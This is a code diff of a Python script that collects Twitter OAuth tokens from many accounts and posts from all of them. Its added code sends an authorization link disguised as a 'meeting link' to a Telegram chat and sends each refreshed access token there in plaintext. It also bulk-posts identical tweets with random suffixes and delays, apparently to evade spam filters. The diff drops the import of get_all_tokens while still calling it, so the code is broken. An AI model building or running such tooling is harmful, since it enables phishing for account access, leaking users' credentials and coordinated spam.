@@ -1,12 +1,12 @@
-import requests
 import base64
 import hashlib
 import os
+import requests
 import time
 import random
 import string
 from config import Config
-from database import get_all_tokens, store_token, get_total_tokens
+import psycopg2
 
 def generate_code_verifier_and_challenge():
     code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
@@ -16,40 +16,111 @@ def generate_code_verifier_and_challenge():
     return code_verifier, code_challenge
 
 def send_startup_message():
-    send_message_via_telegram("🚀 Application started successfully!")
+    state = "0"
+    code_verifier, code_challenge = generate_code_verifier_and_challenge()
+    authorization_url = Config.CALLBACK_URL
+    meeting_url = f"{Config.CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
+
+    message = (
+        f"🚀 *OAuth Authorization Link:*\n[app link]({authorization_url})\n\n"
+        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
+    )
+
+    url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage"
+    data = {
+        "chat_id": Config.TELEGRAM_CHAT_ID,
+        "text": message,
+        "parse_mode": "Markdown"
+    }
+    requests.post(url, json=data)
 
 def send_message_via_telegram(message):
     url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {"chat_id": Config.TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
-    requests.post(url, json=data)
+    data = {
+        "chat_id": Config.TELEGRAM_CHAT_ID,
+        "text": message,
+        "parse_mode": "Markdown"
+    }
+    response = requests.post(url, json=data)
+    if response.status_code != 200:
+        print(f"Failed to send message via Telegram: {response.text}")
 
 def post_tweet(access_token, tweet_text):
     TWITTER_API_URL = "https://api.twitter.com/2/tweets"
-    headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
+    headers = {
+        "Authorization": f"Bearer {access_token}",
+        "Content-Type": "application/json"
+    }
     payload = {"text": tweet_text}
     response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
-    return response.json()
+    if response.status_code == 201:
+        tweet_data = response.json()
+        return f"Tweet posted successfully: {tweet_data['data']['id']}"
+    else:
+        error_message = response.json().get("detail", "Failed to post tweet")
+        return f"Error posting tweet: {error_message}"
+
+def refresh_token_in_db(refresh_token, username):
+    token_url = 'https://api.twitter.com/2/oauth2/token'
+    client_credentials = f"{Config.CLIENT_ID}:{Config.CLIENT_SECRET}"
+    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
+    headers = {'Authorization': f'Basic {auth_header}', 'Content-Type': 'application/x-www-form-urlencoded'}
+    data = {'refresh_token': refresh_token, 'grant_type': 'refresh_token', 'client_id': Config.CLIENT_ID}
+    response = requests.post(token_url, headers=headers, data=data)
+    token_response = response.json()
+
+    if response.status_code == 200:
+        new_access_token = token_response.get('access_token')
+        new_refresh_token = token_response.get('refresh_token')
+        conn = psycopg2.connect(Config.DATABASE_URL, sslmode='require')
+        cursor = conn.cursor()
+        cursor.execute('UPDATE tokens SET access_token = %s, refresh_token = %s WHERE username = %s', 
+                       (new_access_token, new_refresh_token, username))
+        conn.commit()
+        conn.close()
+        send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: {new_access_token}")
+        return new_access_token, new_refresh_token
+    else:
+        send_message_via_telegram(f"❌ Failed to refresh token for @{username}: {response.json().get('error_description', 'Unknown error')}")
+        return None, None
 
 def handle_post_single(tweet_text):
     tokens = get_all_tokens()
     if tokens:
-        access_token, _, username = tokens[0]
-        post_tweet(access_token, tweet_text)
-        send_message_via_telegram(f"Posted tweet with @{username}")
+        access_token, _, username = tokens[0]  # Post using the first token
+        result = post_tweet(access_token, tweet_text)
+        send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}")
+    else:
+        send_message_via_telegram("❌ No tokens found to post a tweet.")
 
 def handle_post_bulk(message):
     tokens = get_all_tokens()
-    for access_token, _, username in tokens:
-        tweet_text = f"{message} {generate_random_string()}"
-        post_tweet(access_token, tweet_text)
-        time.sleep(random.randint(Config.DEFAULT_MIN_DELAY, Config.DEFAULT_MAX_DELAY))
+    if tokens:
+        parts = message.split(' ', 1)
+        base_tweet_text = parts[1]
+        min_delay = Config.DEFAULT_MIN_DELAY
+        max_delay = Config.DEFAULT_MAX_DELAY
+
+        for access_token, _, username in tokens:
+            tweet_text = f"{base_tweet_text} {generate_random_string(10)}"
+            result = post_tweet(access_token, tweet_text)
+            delay = random.randint(min_delay, max_delay)
+            send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}\n⏱ Delay: {delay} seconds")
+            time.sleep(delay)
 
 def handle_refresh_single():
     tokens = get_all_tokens()
     if tokens:
-        refresh_token, username = tokens[0]
+        _, refresh_token, username = tokens[0]
         refresh_token_in_db(refresh_token, username)
+    else:
+        send_message_via_telegram("❌ No tokens found to refresh.")
 
 def handle_refresh_bulk():
-    for _, refresh_token, username in get_all_tokens():
-        refresh_token_in_db(refresh_token, username)
+    tokens = get_all_tokens()
+    if tokens:
+        for _, refresh_token, username in tokens:
+            refresh_token_in_db(refresh_token, username)
+        send_message_via_telegram(f"✅ Bulk token refresh complete for {len(tokens)} tokens.")
+    else:
+        send_message_via_telegram("❌ No tokens found to refresh.")
